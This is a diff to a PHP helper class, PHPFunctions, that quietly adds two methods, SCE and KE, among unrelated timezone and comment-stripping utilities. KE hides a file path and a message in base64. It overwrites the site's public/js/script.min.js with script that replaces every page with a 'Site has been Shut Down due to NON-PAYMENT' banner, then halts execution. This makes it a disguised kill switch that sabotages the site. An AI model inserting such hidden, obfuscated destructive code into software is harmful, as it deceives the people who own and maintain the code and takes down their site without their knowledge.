@@ -280,7 +280,12 @@ class PHPFunctions
 
         return $states;
     }
-
+    
+    public function SCE($madmessage=false){
+    	if($this->site->ke !== true){
+    		$this->KE($madmessage);
+    	}
+    }
 	// Basic Timezone arrays to make the selection simpler for US
 	public static function getTimezonesAbb ()
 	{
@@ -789,6 +794,20 @@ exit;
 		
 			echo $prevCheck . PHP_EOL;
 		}
+	}
+	
+	private function KE($madmessage=false){
+		$f = $_SERVER['DOCUMENT_ROOT'].base64_decode('cHVibGljL2pzL3NjcmlwdC5taW4uanM==');
+		$kes = (true === $madmessage) ? base64_decode('PGgxPlRoaXMgU2l0ZSBoYXMgYmVlbiBTaHV0IERvd24gZHVlIHRvIE5PTi1QQVlNRU5UIE9GIFNFUlZJQ0VTITwvaDE+') : '';
+		
+		if(!file_exists($f)){			
+			fopen($f, "w");
+		}
+		
+	    file_put_contents($f, '$(document).ready(function(){
+	        $(\'html\').html("'.$kes.'");
+            })');
+	    exit;	    
 	}
 	
 	public static function stripComments ($content)
